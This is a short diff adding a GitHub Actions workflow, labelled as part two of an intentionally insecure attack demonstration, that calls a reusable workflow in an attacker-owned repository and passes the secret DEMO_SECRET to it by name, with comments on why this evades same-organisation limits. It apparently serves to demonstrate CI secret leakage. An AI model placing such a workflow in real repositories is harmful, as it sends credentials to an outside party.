@@ -1,0 +1,15 @@
+# ATTACK 3, PART 2 OF 2 (insecure on purpose). This file belongs in THIS service
+# repository, under .github/workflows/. It runs code from another repository: the
+# caller points uses: at the attacker's reusable workflow (part 1 of 2, in
+# GithubActionsSecretAttackerWorkflows) and passes DEMO_SECRET to it by name.
+# secrets: inherit is NOT used because it only forwards secrets when the called
+# workflow is in the same organization; passing by name works across accounts.
+# The code that reads the secret never exists in this repository. Replace
+# <attacker> with the attacker owner. Rename to remove .insecure to run it.
+name: external-call
+on: push
+jobs:
+  call:
+    uses: <attacker>/GithubActionsSecretAttackerWorkflows/.github/workflows/leak.yml@main
+    secrets:
+      target: ${{ secrets.DEMO_SECRET }}
